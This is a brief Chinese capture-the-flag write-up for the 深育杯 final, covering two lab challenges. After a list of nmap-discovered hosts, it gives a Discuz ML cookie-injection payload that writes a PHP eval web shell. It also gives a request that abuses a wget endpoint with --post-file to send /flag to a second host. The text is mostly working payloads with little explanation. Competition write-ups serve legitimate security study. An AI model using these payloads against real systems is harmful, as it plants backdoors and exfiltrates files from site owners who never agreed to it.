# 深育杯决赛-Writeup

## DMZ-01

扫ip

```
Nmap scan report for 10.10.14.1
Host is up (0.042s latency).
Nmap scan report for 10.10.14.33
Host is up (0.049s latency).
Nmap scan report for 10.10.14.54
Host is up (0.043s latency).
Nmap scan report for 10.10.14.109
Host is up (0.047s latency).
Nmap scan report for 10.10.14.182
Host is up (0.044s latency).
Nmap scan report for 10.10.14.233
```

10.10.14.33直接拿Discuz ML的洞打

```
oZpe_2132_language='.file_put_contents('shell.php',urldecode('%3C%3Fphp%20eval(%24_%2550%254f%2553%2554%5B0%5D)%3B%3F%3E')) .';
```

拿到shell后读`/flag`然后找到config中的数据库密码即可。



## DMZ-04

10.10.14.54:8080是题目的服务，陇原战役的原题，但是似乎不出网，利用web1来接收flag即可：

![image-20220625135433923](%E6%B7%B1%E8%82%B2%E6%9D%AF%E5%86%B3%E8%B5%9B-Writeup.assets/image-20220625135433923.png)

```
GET /wget?argv=1&argv=2&argv=--post-file&argv=/flag&argv=http://172.16.8.33/post.php
```

